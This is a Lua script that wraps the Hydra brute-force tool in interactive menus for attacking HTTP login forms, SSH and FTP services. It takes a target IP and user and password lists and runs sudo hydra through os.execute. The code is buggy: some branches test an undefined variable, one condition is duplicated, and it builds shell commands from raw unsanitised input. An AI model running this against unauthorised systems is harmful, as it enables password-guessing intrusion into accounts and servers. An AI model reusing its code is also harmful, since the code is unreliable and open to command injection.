-- hydra brute force tool for http


function hydra_http()
    print([[[1] Use a list of users    
[2] Specify a username]])    
    io.write("\nEnter value: ")
    local value_user = io.read()
    if value_user == "1" then
        io.write("Enter path to users list: ")
        path_user = io.read()
    elseif value_user == "2" then
        io.write("Enter username: ")
        username = io.read()
    elseif value_user == "quit" then 
        os.exit(0)
    else
        print("Invalid value..!!")
        os.exit(0)
    end
    print("\n")
    print([[[1] Use a list of passwords.txt    
[2] Specify a password.txt]])  
    io.write("\nEnter value: ")
    local value_pass = io.read()
    if value_pass == "1" then
        io.write("Enter path to passwords list: ")
        path_pass = io.read()
    elseif value == "2" then
        io.write("Enter password text: ")
        password = io.read()
    elseif value ==  "quit" then
        os.exit(0)
    else
        print("Invalid input value..!!")
        os.exit(0)
    end
    io.write("Enter target IP: ")
    local target = io.read()
    io.write("Url login path: ")
    local path_login = io.read()
    io.write("Enter the fail statement to check: ")
    local fail_statement = io.read()
    if value_user == "1" and (value_pass == "1") then
        os.execute('sudo hydra -L '..path_user..' -P /usr/share/wordlists/'..path_pass..' -u -f '..target..' http-post-form "/'..path_login..':username=^USER^&password=^PASS^:F='..fail_statement..'"')
    elseif value_user == "1" and (value_pass == "2") then
        os.execute('sudo hydra -L '..path_user..' -p '..password..' -u -f '..target..' http-post-form "/'..path_login..':username=^USER^&password=^PASS^:F='..fail_statement..'"')
    elseif value_user == "2" and (value_pass == "1") then
        os.execute('sudo hydra -l '..username..' -P '..path_pass..' -u -f '..target..' http-post-form "/'..path_login..':username=^USER^&password=^PASS^:F='..fail_statement..'"')
    elseif value_user == "2" and (value_pass == "1") then
        os.execute('sudo hydra -l '..username..' -p '..password..' -u -f '..target..' http-post-form "/'..path_login..':username=^USER^&password=^PASS^:F='..fail_statement..'"')
    else
        print("Error executing command based on inputs..!!")
        os.exit(0)
    end
end


-- hydra brute force tool for ssh


function hydra_ssh()
    print("enter quit to terminate")

    print([[[1] Use a list of users.
[2] Specify a username.
    ]])
    io.write("Enter value: ")
    local value_user = io.read()
    if value_user == "1" then
        io.write("Enter path to users list: ")
        ssh_users = io.read()
    elseif value_user == "2" then
        io.write("Enter target username: ")
        ssh_user = io.read()
    elseif value_user == "quit" then
        os.exit(0)
    else
        print("Invalid input value..!!")
        os.exit(0)
    end
    print("\n")
    print([[[1] Use a list of passwords list.
[2] Specify a passwordlist.
    ]])
    io.write("Enter value: ")
    local value_pass = io.read()
    if value_pass == "1" then
        io.write("Enter path to passwordlists: ")
        ssh_pass = io.read()
    elseif value_pass == "2" then
        io.write("Enter the password text: ")
        ssh_passwd = io.read()
    elseif value_pass == "quit" then
        os.exit(0)
    else
        print("Invalid input value..!!")
        os.exit(0)
    end
    io.write("Enter target IP: ")
    local target = io.read()
    io.write("Enter port if port is not 22: ")
    local port = io.read()
    if port == nil then
        port = "22"
    end
    if value_user == "1" and (value_pass == "1") then
        os.execute("sudo hydra -s "..port.." -L "..ssh_users.." -P "..ssh_pass.." ".."-t 4 ssh://"..target)
    elseif value_user == "1" and (value_pass == "2") then
        os.execute("sudo hydra -s "..port.." -L "..ssh_users.." -p "..ssh_passwd.." ".."-t 4 ssh://"..target)
    elseif value_user == "2" and (value_pass == "1") then
        os.execute("sudo hydra -s "..port.." -l "..ssh_user.." -P "..ssh_pass.." ".."-t 4 ssh://"..target)
    elseif value_user == "2" and (value_pass == "2") then
        os.execute("sudo hydra -s "..port.." -l "..ssh_user.." -p "..ssh_passwd.." ".."-t 4 ssh://"..target)
    else
        print("Error executing command based on inputs..!!")
        os.exit(0)
    end
end


-- hydra brute force tool for ftp


function hydra_ftp()
    print([[[1] Use a list of users.
[2] Specify a username.
    ]])
    io.write("Enter value: ")
    local value_user = io.read()
    if value == "1" then
        io.write("Enter path to users list: ")
        ftp_users = io.read()
    elseif value == "2" then
        io.write("Enter target username: ")
        ftp_user = io.read()
    elseif value == "quit" then
        os.exit(0)
    else
        print("Invalid input value..!!")
        os.exit(0)
    end
    print("\n")
    print([[[1] Use a list of passwords list.
[2] Specify a passwordlist.
    ]])
    io.write("Enter value: ")
    local value_pass = io.read()
    if value_pass == "1" then
        io.write("Enter path to passwordlists: ")
        ftp_pass = io.read()
    elseif value_pass == "2" then
        io.write("Enter the password text: ")
        ftp_passwd = io.read()
    elseif value_pass == "quit" then
        os.exit(0)
    else
        print("Invalid input value..!!")
        os.exit(0)
    end
    io.write("Enter target IP: ")
    local target = io.read()
    if value_user == "1" and (value_pass == "1") then
        os.execute("sudo hydra -L "..ftp_users.." -P "..ftp_pass.." ".."ftp://"..target)
    elseif value_user == "1" and (value_pass == "2") then
        os.execute("sudo hydra -L "..ftp_users.." -p "..ftp_passwd.." ".."ftp://"..target)
    elseif value_user == "2" and (value_pass == "1") then
        os.execute("sudo hydra -l "..ftp_user.." -P "..ftp_pass.." ".."ftp://"..target)
    elseif value_user == "2" and (value_pass == "2") then
        os.execute("sudo hydra -l "..ftp_user.." -p "..ftp_passwd.." ".."ftp://"..target)
    else
        print("Error executing command based on inputs..!!")
        os.exit(0)
    end
end
